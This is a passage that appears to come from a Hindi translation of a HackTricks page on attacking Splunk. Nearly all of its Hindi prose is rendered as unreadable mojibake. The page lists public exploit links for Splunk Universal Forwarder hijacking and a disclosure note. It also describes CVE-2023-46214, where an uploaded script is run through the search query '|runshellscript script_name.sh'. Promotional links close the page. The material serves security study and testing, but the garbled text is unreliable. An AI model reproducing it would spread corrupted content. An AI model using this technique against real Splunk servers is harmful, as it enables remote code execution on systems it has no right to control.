рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рд░реВрдк рд╕реЗ рдЙрдкрдпреЛрдЧреА exploits:

* https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
* https://www.exploit-db.com/exploits/46238
* https://www.exploit-db.com/exploits/46487

рд╕рдВрдмрдВрдзрд┐рдд рдмреНрд▓реЙрдЧ рдкреЛрд╕реНрдЯ:

* https://clement.notin.org/blog/2019/02/25/Splunk-Universal-Forwarder-Hijacking-2-SplunkWhisperer2/
* https://medium.com/@airman604/splunk-universal-forwarder-hijacking-5899c3e0e6b2
* https://www.hurricanelabs.com/splunk-tutorials/using-splunk-as-an-offensive-security-tool

_\*\* рдиреЛрдЯ: \*\*_ рдпрд╣ рдореБрджреНрджрд╛ Splunk рд╕рд┐рд╕реНрдЯрдореНрд╕ рдХреЗ рд╕рд╛рде рдПрдХ рдЧрдВрднреАрд░ рдореБрджреНрджрд╛ рд╣реИ рдФрд░ рдЗрд╕рдХрд╛ рдЕрдиреНрдп рдкрд░реАрдХреНрд╖рдХреЛрдВ рджреНрд╡рд╛рд░рд╛ рд╡рд░реНрд╖реЛрдВ рд╕реЗ рд╢реЛрд╖рдг рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рдЬрдмрдХрд┐ Remote Code Execution Splunk Universal Forwarder рдХреА рдПрдХ рдЗрд░рд╛рджрд╛ рдХреА рдЧрдИ рд╕реБрд╡рд┐рдзрд╛ рд╣реИ, рдЗрд╕рдХрд╛ рдХрд╛рд░реНрдпрд╛рдиреНрд╡рдпрди рдЦрддрд░рдирд╛рдХ рд╣реИред рдореИрдВрдиреЗ рдЗрд╕ рдмрдЧ рдХреЛ Splunk рдХреЗ рдмрдЧ рдЗрдирд╛рдо рдХрд╛рд░реНрдпрдХреНрд░рдо рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рдмрдорд┐рдЯ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХреА, рдмрд╣реБрдд рдХрдо рд╕рдВрднрд╛рд╡рдирд╛ рдореЗрдВ рдХрд┐ рд╡реЗ рдбрд┐рдЬрд╛рдЗрди рдкреНрд░рднрд╛рд╡реЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрд╡рдЧрдд рдирд╣реАрдВ рд╣реИрдВ, рд▓реЗрдХрд┐рди рдореБрдЭреЗ рд╕реВрдЪрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рдХрд┐ рдХрд┐рд╕реА рднреА рдмрдЧ рд╕рдмрдорд┐рд╢рди рдХреЛ Bug Crowd/Splunk рдкреНрд░рдХрдЯреАрдХрд░рдг рдиреАрддрд┐ рдХреЛ рд▓рд╛рдЧреВ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рдЬреЛ рдХрд╣рддрд╛ рд╣реИ рдХрд┐ рдХрдордЬреЛрд░реА рдХреЗ рд╡рд┐рд╡рд░рдг рдХреЛ рдХрднреА рднреА рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рд░реВрдк рд╕реЗ рдЪрд░реНрдЪрд╛ рдирд╣реАрдВ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ _рдХрднреА_ Splunk рдХреА рдЕрдиреБрдорддрд┐ рдХреЗ рдмрд┐рдирд╛ред рдореИрдВрдиреЗ 90 рджрд┐рдиреЛрдВ рдХреА рдкреНрд░рдХрдЯреАрдХрд░рдг рд╕рдордпрд░реЗрдЦрд╛ рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд┐рдпрд╛ рдФрд░ рдЗрдирдХрд╛рд░ рдХрд░ рджрд┐рдпрд╛ рдЧрдпрд╛ред рдЗрд╕ рддрд░рд╣, рдореИрдВрдиреЗ рдЗрд╕реЗ рдЬрд┐рдореНрдореЗрджрд╛рд░реА рд╕реЗ рдкреНрд░рдХрдЯ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдХреНрдпреЛрдВрдХрд┐ рдореИрдВ рдХрд╛рдлреА рдирд┐рд╢реНрдЪрд┐рдд рд╣реВрдБ рдХрд┐ Splunk рдЗрд╕ рдореБрджреНрджреЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рдЕрдирджреЗрдЦрд╛ рдХрд░рдиреЗ рдХрд╛ рдЪреБрдирд╛рд╡ рдХрд┐рдпрд╛ рд╣реИ, рдореБрдЭреЗ рд▓рдЧрддрд╛ рд╣реИ рдХрд┐ рдпрд╣ рдХрдВрдкрдирд┐рдпреЛрдВ рдХреЛ рдЧрдВрднреАрд░рддрд╛ рд╕реЗ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдФрд░ рдпрд╣ рдЗрдиреНрдлреЛрд╕реЗрдХ рд╕рдореБрджрд╛рдп рдХреА рдЬрд┐рдореНрдореЗрджрд╛рд░реА рд╣реИ рдХрд┐ рд╡реНрдпрд╛рдкрд╛рд░реЛрдВ рдХреЛ рд╢рд┐рдХреНрд╖рд┐рдд рдХрд░реЗрдВред

## Splunk Queries рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ

рдЬрд╛рдирдХрд╛рд░реА [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis) рд╕реЗ

**CVE-2023-46214** рдиреЗ **`$SPLUNK_HOME/bin/scripts`** рдореЗрдВ рдПрдХ рдордирдорд╛рдиреА рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдЕрдкрд▓реЛрдб рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреА рдФрд░ рдлрд┐рд░ рдмрддрд╛рдпрд╛ рдХрд┐ рд╕рд░реНрдЪ рдХреНрд╡реЗрд░реА **`|runshellscript script_name.sh`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡рд╣рд╛рдВ рд╕рдВрдЧреНрд░рд╣реАрдд **рд╕реНрдХреНрд░рд┐рдкреНрдЯ** рдХреЛ **рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рдХрд░рдирд╛ рд╕рдВрднрд╡ рдерд╛:

<figure><img src="../../.gitbook/assets/image (721).png" alt=""><figcaption></figcaption></figure>

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) рдХреЗ рд╕рд╛рде рд╢реВрдиреНрдп рд╕реЗ рдирд╛рдпрдХ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong>!</summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рд╣реЛ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ** рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд╛ рд╡рд┐рд╢реЗрд╖ рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ **Twitter** ЁЯРж рдкрд░ рдореБрдЭреЗ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░рдХреЗ PRs рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВред

</details>
